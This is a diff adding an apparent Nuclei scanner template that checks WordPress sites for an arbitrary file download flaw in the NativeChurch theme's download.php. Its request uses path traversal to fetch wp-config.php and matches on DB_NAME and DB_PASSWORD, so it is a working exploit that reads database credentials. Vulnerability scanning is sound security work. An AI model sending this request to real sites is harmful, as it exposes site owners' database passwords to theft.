@@ -1,0 +1,24 @@
+id: nativechurch-wp-theme-lfd
+info:
+  author: 0x_Akoko
+  description: A LFD Bug In download.php File In NativeChurch Theme And Make Site
+    Vulnerable.
+  name: WordPress NativeChurch Theme Arbitrary File Download
+  reference: https://packetstormsecurity.com/files/132297/WordPress-NativeChurch-Theme-1.0-1.5-Arbitrary-File-Download.html
+  severity: high
+  tags: wordpress,wp-theme,lfi
+requests:
+- matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - DB_NAME
+    - DB_PASSWORD
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php'
